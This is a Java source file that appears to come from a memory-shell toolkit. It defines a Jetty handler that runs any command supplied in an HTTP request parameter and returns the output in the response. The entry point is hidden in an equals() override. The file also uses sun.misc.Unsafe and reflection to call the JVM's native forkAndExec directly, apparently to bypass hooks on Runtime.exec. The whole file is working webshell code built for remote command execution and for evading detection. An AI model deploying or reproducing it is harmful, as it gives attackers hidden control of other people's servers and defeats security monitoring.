package com.reajason.javaweb.memshell.shelltool.command;

import sun.misc.Unsafe;

import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * @author ReaJason
 * @since 2025/5/15
 */
public class CommandJettyHandler {
    public static String paramName;

    public String getParam(String param) {
        return param;
    }

    @Override
    public boolean equals(Object obj) {
        Object[] args = ((Object[]) obj);
        Object baseRequest = null;
        Object request = null;
        Object response = null;
        if (args.length == 4) {
            Object arg4 = args[3];
            baseRequest = args[1];
            if (arg4 instanceof Integer) {
                // jetty6
                request = args[1];
                response = args[2];
            } else {
                request = args[2];
                response = args[3];
            }
        } else {
            // ee10
            request = args[0];
            response = args[1];
        }
        try {
            String cmd = getParam((String) request.getClass().getMethod("getParameter", String.class).invoke(request, paramName));
            if (cmd != null) {
                if (baseRequest != null) {
                    baseRequest.getClass().getMethod("setHandled", boolean.class).invoke(baseRequest, true);
                }
                InputStream inputStream = null;
                try {
                    inputStream = forkAndExec(cmd);
                } catch (Throwable e) {
                    inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                }
                OutputStream outputStream = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
                byte[] buf = new byte[8192];
                int length;
                while ((length = inputStream.read(buf)) != -1) {
                    outputStream.write(buf, 0, length);
                }
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    @SuppressWarnings("all")
    public static InputStream forkAndExec(String cmd) throws Exception {
        String[] strs = cmd.split("\\s+");
        Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);

        Class<?> processClass = null;

        try {
            processClass = Class.forName("java.lang.UNIXProcess");
        } catch (ClassNotFoundException e) {
            processClass = Class.forName("java.lang.ProcessImpl");
        }
        Object processObject = unsafe.allocateInstance(processClass);

        byte[][] args = new byte[strs.length - 1][];
        int size = args.length;

        for (int i = 0; i < args.length; i++) {
            args[i] = strs[i + 1].getBytes();
            size += args[i].length;
        }

        byte[] argBlock = new byte[size];
        int i = 0;

        for (byte[] arg : args) {
            System.arraycopy(arg, 0, argBlock, i, arg.length);
            i += arg.length + 1;
        }

        int[] envc = new int[1];
        int[] std_fds = new int[]{-1, -1, -1};
        byte[] result = toCString(strs[0]);
        try {
            Field helperpathField = processClass.getDeclaredField("helperpath");
            helperpathField.setAccessible(true);
            byte[] helperpathObject = (byte[]) helperpathField.get(processObject);

            Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
            launchMechanismField.setAccessible(true);
            Object launchMechanismObject = launchMechanismField.get(processObject);
            int mode = 0;
            try {
                Field value = launchMechanismObject.getClass().getDeclaredField("value");
                value.setAccessible(true);
                mode = (Integer) value.get(launchMechanismObject);
            } catch (NoSuchFieldException e) {
                int ordinal = (Integer) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);
                mode = ordinal + 1;
            }

            Method forkMethod = processClass.getDeclaredMethod("forkAndExec", int.class, byte[].class, byte[].class, byte[].class, int.class,
                    byte[].class, int.class, byte[].class, int[].class, boolean.class);
            forkMethod.setAccessible(true);
            forkMethod.invoke(processObject, mode, helperpathObject, result, argBlock, args.length,
                    null, envc[0], null, std_fds, false);
        } catch (NoSuchFieldException e) {
            // JDK7
            Method forkMethod = processClass.getDeclaredMethod("forkAndExec", byte[].class, byte[].class, int.class,
                    byte[].class, int.class, byte[].class, int[].class, boolean.class);
            forkMethod.setAccessible(true);
            forkMethod.invoke(processObject, result, argBlock, args.length,
                    null, envc[0], null, std_fds, false);
        }

        try {
            Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
            initStreamsMethod.setAccessible(true);
            initStreamsMethod.invoke(processObject, std_fds);
        } catch (NoSuchMethodException e) {
            // JDK11
            Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class, boolean.class);
            initStreamsMethod.setAccessible(true);
            initStreamsMethod.invoke(processObject, std_fds, false);
        }

        Method getInputStreamMethod = processClass.getMethod("getInputStream");
        getInputStreamMethod.setAccessible(true);
        return (InputStream) getInputStreamMethod.invoke(processObject);
    }

    private static byte[] toCString(String s) {
        if (s == null)
            return null;
        byte[] bytes = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0,
                result, 0,
                bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }
}
